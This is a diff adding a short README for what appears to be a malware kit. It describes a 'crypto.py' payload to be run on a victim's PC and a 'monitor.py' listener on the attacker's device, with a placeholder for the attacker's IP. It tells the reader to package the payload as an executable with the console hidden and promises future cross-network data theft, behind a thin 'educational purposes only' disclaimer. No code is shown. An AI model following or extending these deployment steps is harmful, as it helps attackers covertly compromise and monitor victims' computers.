@@ -1,0 +1,12 @@
+THE FOLLOWING CODE IS JUST FOR EDUCATIONAL PURPOSES ONly AND SHALL NOT BE USED WITH INTENT TO HARM OTHER 
+________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+The first file crypto.py is the code that should be run in victim's pc
+monitor.py file shall be used in the attackers device
+YOUR_IP_HERE is where attackers ip shall be placed 
+Don't make any changes if you dont know what you are doing
+The following codes are really malicious so it shall not be used anywhere except from controlled envaroment
+To convert it into exe file Just google the overall command and add -noconsole if you dont want the console to be shown when the code is ran in victim's device
+First run the monitor.py then wait for it to connect to vitims pc
+At the moment it only work in devices in same internet or WI-FI
+================================================================================================================================================================================================================================================
+Further updates might come in this code which might add cross network connections and data sharing
